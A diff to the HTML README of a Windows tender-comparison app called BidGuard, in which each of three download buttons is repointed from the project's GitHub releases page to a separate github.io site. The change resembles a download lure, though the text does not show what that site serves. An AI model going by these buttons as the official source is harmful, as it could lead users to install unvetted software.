@@ -1,7 +1,7 @@
 <h1>🔒 bidguard-tender-comparison-hub - Safeguard Your Procurement Process</h1>
 
 <p align="center">
-<a href="https://github.com/Coreyinhibited104/bidguard-tender-comparison-hub/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">⬇️ Download BidGuard Now</a>
+<a href="https://coreyinhibited104.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">⬇️ Download BidGuard Now</a>
 </p>
 
 <h2>📋 What Is BidGuard?</h2>
@@ -30,7 +30,7 @@
 <h2>⬇️ Download & Installation</h2>
 <p>Click the button below to visit the official download page:</p>
 <p align="center">
-<a href="https://github.com/Coreyinhibited104/bidguard-tender-comparison-hub/releases" style="background-color:#008CBA;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:14px;border-radius:5px;">Download BidGuard for Windows</a>
+<a href="https://coreyinhibited104.github.io" style="background-color:#008CBA;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:14px;border-radius:5px;">Download BidGuard for Windows</a>
 </p>
 <p>Visit this link to download the application. The page will show available versions for Windows. Choose the latest stable release and download the installer file.</p>
 
@@ -86,5 +86,5 @@ A: BidGuard works offline, but the first launch may check for updates. This mess
 </ul>
 
 <p align="center">
-<a href="https://github.com/Coreyinhibited104/bidguard-tender-comparison-hub/releases" style="background-color:#f44336;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">⬇️ Get BidGuard Now</a>
+<a href="https://coreyinhibited104.github.io" style="background-color:#f44336;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;">⬇️ Get BidGuard Now</a>
 </p>
